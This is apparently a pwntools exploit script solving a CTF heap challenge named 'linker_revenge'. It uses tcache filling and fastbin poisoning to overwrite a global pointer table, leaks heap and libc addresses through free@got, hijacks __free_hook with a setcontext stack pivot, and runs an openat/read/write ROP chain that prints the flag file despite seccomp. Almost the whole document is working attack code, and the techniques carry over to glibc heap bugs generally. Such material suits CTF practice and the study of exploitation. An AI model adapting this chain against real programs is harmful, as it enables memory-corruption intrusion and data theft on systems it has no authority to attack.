from pwn import *

p = process("./linker_revenge", env={"LD_PRELOAD":"./libc.so.6"})
e = ELF('./linker_revenge')
libc = ELF("libc.so.6")

def new(size):
    p.sendlineafter("> ", "1\0\0")
    p.sendlineafter(":\n", str(size))
def edit(index, data):
    p.sendlineafter("> ", "2\0\0")
    p.sendlineafter(":\n", str(index))
    p.sendafter(":\n", data)
def delete(index):
    p.sendlineafter("> ", "3\0\0")
    p.sendlineafter(":\n", str(index))
def show(index):
    p.sendlineafter("> ", "5\0\0")
    p.sendlineafter(":\n", str(index))
    return p.recvline()

p.sendlineafter('size:\n','5')
p.sendafter('name:\n','flag\x00')

'''
Chunk 0 - 6, count = 7: size 0x70
tcache is full
'''
for i in range(7):
	new(0x68)
	delete(0)

new(0x68) #  chunk 0 -> fastbin
new(0x68) #  chunk 1 -> fastbin

delete(0)
delete(1)

'''
chunk[0]->fd = 0x00203d
'''
edit(1, p64(0x60203d))  

new(0x68) # chunk 0
new(0x68) # chunk 1 -> 0c60203d + 0x10

payload  = b'AAA'
payload += p64(0) * 2
payload += p32(0xff) * 8           # int
payload += p32(1) * 3 + p32(0) * 5 # int
payload += p64(0x602060) # ptr[0] = &page_size
payload += p64(0x602020) # ptr[1] = free@got
payload += p64(0x6020b8) # ptr[2] = ptr[3]

'''
Edit the payload to be overwrite the page_size and the page_table
to the desired locations and also to get the LIBC address
'''
edit(1, payload)
new(0x408) # chunk 3

heap_base = u64(show(2).strip().ljust(8, b"\x00")) - 0x2290 # ptr[2] -> ptr[3] == heap_chunk  0x410
log.info(f"HEAP:   {hex(heap_base)}")

libc.address = u64(show(1).strip().ljust(8, b"\x00")) - libc.symbols['_IO_2_1_stdout_'] # ptr[1] = free@got
log.info(f"LIBC:   {hex(libc.address)}")


syscall = libc.address + 0x00000000000d2975
pop_rsi = libc.address + 0x0000000000023e6a
pop_rax = libc.address + 0x00000000000439c8
pop_rdx = libc.address + 0x0000000000001b96
pop_rdi = libc.address + 0x000000000002155f

payload  = p32(0x4ff) * 8 # page_size -> array
payload += p32(1) * 5 + p32(0) * 3
payload += p64(0x602060) + p64(libc.symbols["__free_hook"]) # ptr[0] = page_size, ptr[1] == __free_hook
edit(0, payload) # ptr[0] = page_table
edit(1, p64(libc.symbols["setcontext"] + 0x35)) # ptr[1] == __free_hook => setcontexr + 53

'''
setcontext+35 is used here because to stack pivot as seccomp
s enabled, only ORW is allowed, we used this to stack pivot
to get around the payload to store
0x7f12c88450a5 <setcontext+53>:  mov    rsp,QWORD PTR [rdi+0xa0]
0x7f12c88450ac <setcontext+60>:  mov    rbx,QWORD PTR [rdi+0x80]
0x7f12c88450b3 <setcontext+67>:  mov    rbp,QWORD PTR [rdi+0x78]
0x7f12c88450b7 <setcontext+71>:  mov    r12,QWORD PTR [rdi+0x48]
0x7f12c88450bb <setcontext+75>:  mov    r13,QWORD PTR [rdi+0x50]
0x7f12c88450bf <setcontext+79>:  mov    r14,QWORD PTR [rdi+0x58]
0x7f12c88450c3 <setcontext+83>:  mov    r15,QWORD PTR [rdi+0x60]
0x7f12c88450c7 <setcontext+87>:  mov    rcx,QWORD PTR [rdi+0xa8]
0x7f12c88450ce <setcontext+94>:  push   rcx
0x7f12c88450cf <setcontext+95>:  mov    rsi,QWORD PTR [rdi+0x70]
0x7f12c88450d3 <setcontext+99>:  mov    rdx,QWORD PTR [rdi+0x88]
0x7f12c88450da <setcontext+106>: mov    rcx,QWORD PTR [rdi+0x98]
0x7f12c88450e1 <setcontext+113>: mov    r8,QWORD PTR [rdi+0x28]
0x7f12c88450e5 <setcontext+117>: mov    r9,QWORD PTR [rdi+0x30]
0x7f12c88450e9 <setcontext+121>: mov    rdi,QWORD PTR [rdi+0x68]
0x7f12c88450ed <setcontext+125>: xor    eax,eax
0x7f12c88450ef <setcontext+127>: ret 
'''

payload = b''
payload += b"flag\x00\x00\x00\x00" + p64(0) # rdi + 0x00
payload += p64(0) + p64(0) # rdi + 0x10
payload += p64(0) + p64(0) # rdi + 0x20 --> XXX, r8
payload += p64(0) + p64(0) # rdi + 0x30 --> r9 , XXX
payload += p64(0) + p64(0) # rdi + 0x40 --> XXX, r12
payload += p64(0) + p64(0) # rdi + 0x50 --> r13, r14
payload += p64(0) + p64(0xffffffffffffff9c) # rdi + 0x60 --> r15, rdi
payload += p64(heap_base + 0x2290) + p64(0) # rdi + 0x70 --> rsi, rbp
payload += p64(0) + p64(0) # rdi + 0x80 --> rbx, rdx
payload += p64(0) + p64(0) # rdi + 0x90 --> XXX, rcx
payload += p64(heap_base + 0x2340 - 8)
payload += p64(pop_rax) # rdi + 0xa0 --> rsp, rip


# openat(0, "flag", 0)
payload += p64(pop_rax)
payload += p64(257)
payload += p64(syscall)

# read(3, heap, 0x40)

payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(0x0000000000401301)
payload += p64(heap_base) + p64(0)
payload += p64(pop_rdx)
payload += p64(0x40)
payload += p64(syscall)

# write(1, heap, 0x40)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(0x0000000000401301)
payload += p64(heap_base) + p64(0)
payload += p64(pop_rdx)
payload += p64(0x40)
payload += p64(syscall)

edit(3, payload)

delete(3) # flag -> ptr[3] == heap_base -> stack_pivot
p.interactive()